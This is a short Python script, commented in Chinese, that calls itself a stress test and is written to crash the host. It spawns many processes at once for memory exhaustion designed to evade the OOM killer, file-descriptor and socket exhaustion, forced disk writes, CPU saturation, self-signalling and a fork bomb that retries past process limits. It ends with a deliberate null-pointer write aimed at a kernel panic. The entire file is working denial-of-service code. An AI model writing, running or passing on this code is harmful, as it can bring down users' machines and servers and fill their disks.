import os
import sys
import ctypes
import time
import socket
import signal
import random
import multiprocessing
from fcntl import ioctl

# ===== 终极警告 =====
print("[💣] Python 标准库版压力测试启动！5秒后系统可能崩溃...")
time.sleep(5)

# ===== 1. 内存耗尽 + 碎片化攻击 =====
def ram_terror():
    chunks = []
    chunk_size = 10 * 1024 * 1024  # 10MB 小块，更难被 OOM Killer 检测
    while True:
        try:
            chunks.append(bytearray(chunk_size))  # 标准库方式分配内存
            time.sleep(0.01)  # 稍微延迟，让碎片化更严重
        except MemoryError:
            chunk_size = max(1, chunk_size // 2)  # 内存不足就减小块大小继续分配

# ===== 2. 文件描述符耗尽 =====
def fd_attack():
    socks = []
    files = []
    try:
        while True:
            # 疯狂创建 socket 和文件
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('0.0.0.0', random.randint(1024, 65535)))
            socks.append(s)
            f = open(f"/tmp/junk_{len(files)}.bin", "wb")
            files.append(f)
    except:  # 达到 ulimit -n 限制后换方式继续
        fd_attack()

# ===== 3. 磁盘 I/O 风暴 =====
def disk_storm():
    try:
        while True:
            with open("/tmp/io_attack.bin", "ab") as f:
                f.write(os.urandom(1024 * 1024))  # 1MB 随机数据写入
                os.fsync(f.fileno())  # 强制刷盘，增加磁盘压力
    except:
        disk_storm()  # 递归继续

# ===== 4. CPU 100% 负载 =====
def cpu_killer():
    while True:
        sum(x * x for x in range(10**6))  # 纯计算密集型

# ===== 5. 信号洪水攻击 =====
def signal_flood():
    while True:
        os.kill(os.getpid(), signal.SIGTERM)  # 自己杀自己，造成调度混乱

# ===== 6. Fork 炸弹（Python 版） =====
def py_fork_bomb():
    while True:
        try:
            pid = os.fork()
            if pid == 0:  # 子进程继续 fork
                py_fork_bomb()
        except BlockingIOError:  # 绕过限制
            py_fork_bomb()

# ===== 主程序 =====
if __name__ == "__main__":
    # 启动所有攻击
    for _ in range(os.cpu_count() * 2):  # 根据 CPU 核心数倍增
        multiprocessing.Process(target=ram_terror).start()
        multiprocessing.Process(target=fd_attack).start()
        multiprocessing.Process(target=disk_storm).start()
        multiprocessing.Process(target=cpu_killer).start()
        multiprocessing.Process(target=signal_flood).start()
        multiprocessing.Process(target=py_fork_bomb).start()

    # 额外尝试触发内核 panic（高风险！）
    if hasattr(ctypes, 'memset'):
        try:
            NULL = ctypes.POINTER(ctypes.c_int)()
            ctypes.memset(NULL, 0, 1)  # 故意访问空指针
        except:
            pass  # 某些系统可能会直接崩溃

    print("[🔥] 所有攻击启动！你電腦还能撑多久？")
